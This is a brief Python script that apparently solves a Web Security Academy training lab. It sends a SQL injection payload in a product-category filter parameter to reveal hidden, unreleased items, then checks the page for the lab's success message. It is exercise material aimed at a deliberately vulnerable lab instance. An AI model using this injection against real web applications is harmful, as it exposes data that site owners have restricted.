# Retrieving hidden data

import requests

url = "https://acb41feb1fcb3cff80da5c9c00e90084.web-security-academy.net/filter?category="
payload = "Gifts' AND released = 1 OR released !=1--"

try:
    r_solve = requests.get(url+payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)